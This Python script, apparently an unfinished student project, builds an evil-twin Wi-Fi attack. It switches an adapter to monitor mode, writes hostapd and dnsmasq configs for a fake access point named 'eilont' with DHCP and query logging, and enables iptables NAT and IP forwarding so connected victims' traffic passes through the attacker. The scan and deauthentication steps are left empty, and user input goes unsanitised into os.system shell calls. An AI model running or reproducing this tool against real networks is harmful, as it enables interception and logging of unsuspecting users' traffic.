import os
import subprocess
import time


def change2monitor(interface):
    os.system('ifconfig ' + interface + ' down')
    os.system('iwconfig ' + interface + ' mode monitor')
    os.system('ifconfig ' + interface + ' up')


if __name__ == '__main__':
    ##------------------------ step 1 monitor mode -------------------------------------------------##
    os.system('iwconfig')
    interface = input("enter your wireless adapter’s name ")
    change2monitor(interface)
    os.system('iwconfig')

    ##------------------------ step 2 scan sets -----------------------------------------------------##

    ##              need to be fill by Barel                  #######
    fake_net_name = "eilont"
    ##------------------------ step 3 create fake access point ---------------------------------------##

    hostapdPath = os.path.join('/root/fap', 'hostapd.conf')
    if not os.path.exists('/root/fap'):
        os.makedirs('/root/fap')
    f = open(hostapdPath, "w")
    f.write("interface=" + interface + "\ndriver=nl80211\nssid=" + fake_net_name + "\nhw_mode=g"
                                       "\nchannel=11\nmacaddr_acl=0\nignore_broadcast_ssid=0")
    f.close()
    # os.system('hostapd /root/fap/hostapd.conf')
    os.system("gnome-terminal -x python3 run_fake_net.py")
    # os.system('python3 run_fake_net.py ' + interface + ' ' + fake_net_name)

    ##------------------------ step 4 DHCP server ---------------------------------------##
    dnsmasqPath = os.path.join('/root/fap', 'dnsmasq.conf')
    if not os.path.exists('/root/fap'):
        os.makedirs('/root/fap')
    f = open(dnsmasqPath, "w")
    f.write("interface=" + interface + "\ndhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n"
                        "dhcp-option=3,192.168.1.1\ndhcp-option=6,192.168.1.1\nserver=8.8.8.8\n"
                        "log-queries\nlog-dhcp\nlisten-address=127.0.0.1")
    f.close()
    os.system('sudo killall -9 dnsmasq')
    os.system('ifconfig ' + interface + ' up 192.168.1.1 netmask 255.255.255.0')
    os.system('route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1')
    os.system("gnome-terminal -x python3 run_DHCP_server.py")
    # os.system('dnsmasq -C dnsmasq.conf -d')

    # os.system('python3 run_DHCP_server.py ' + interface)
    ##------------------------ step 5 iptables ---------------------------------------##
    os.system('iwconfig')
    internet_connection  = input("enter name of the virtual wireless adapter that is connected to the internet")
    os.system('iptables --table nat --append POSTROUTING --out-interface ' + internet_connection + ' -j MASQUERADE')
    os.system('iptables --append FORWARD --in-interface ' + interface + ' -j ACCEPT')
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    while True:
        time.sleep(5)
    ##------------------------ step 6 deauthentication ---------------------------------------##